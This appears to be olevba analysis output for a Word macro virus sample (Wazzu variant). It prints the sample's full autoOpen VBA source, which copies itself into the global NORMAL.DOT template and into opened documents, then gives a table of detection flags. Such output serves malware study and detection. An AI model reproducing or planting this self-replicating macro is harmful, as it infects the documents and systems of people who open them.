olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Wazzu.fe
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Wazzu.fe - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO autoOpen.bas 
in file: ./Virus.MSWord.Wazzu.fe - OLE stream: 'Macros/VBA/autoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Option Explicit


Public Sub MAIN()
Dim TheSmallOne$
Dim TheBigOne$
Dim ThisOne$
Dim SmallFileAtt
    On Error GoTo -1: On Error GoTo jane

    'The Meat Grinder virus - Thanks to Kermit the Frog,
    ' and Kermit the Protocol
    
    TheSmallOne$ = WordBasic.[FileName$]() + ":autoOpen"

    TheBigOne$ = "Global:autoOpen"
    ThisOne$ = UCase(WordBasic.[Right$](WordBasic.[MacroFileName$](WordBasic.[MacroName$](0)), 10))

    If ThisOne$ = "NORMAL.DOT" Then
        SmallFileAtt = GetAttr(WordBasic.[FileName$]())
        If SmallFileAtt >= 32 Then SmallFileAtt = SmallFileAtt - 32
        If SmallFileAtt >= 4 Then SmallFileAtt = SmallFileAtt - 4
        If SmallFileAtt >= 2 Then SmallFileAtt = SmallFileAtt - 2
        If SmallFileAtt = 0 Then
        
            WordBasic.MacroCopy TheBigOne$, TheSmallOne$
            WordBasic.FileSaveAs Format:=1
            WordBasic.SetDocumentDirty 0
        End If
    Else
        WordBasic.MacroCopy TheSmallOne$, TheBigOne$
    End If
    
GoTo oughta_here

jane:

oughta_here:
    On Error GoTo -1: On Error GoTo 0


End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoOpen            |Runs when the Word document is opened        |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

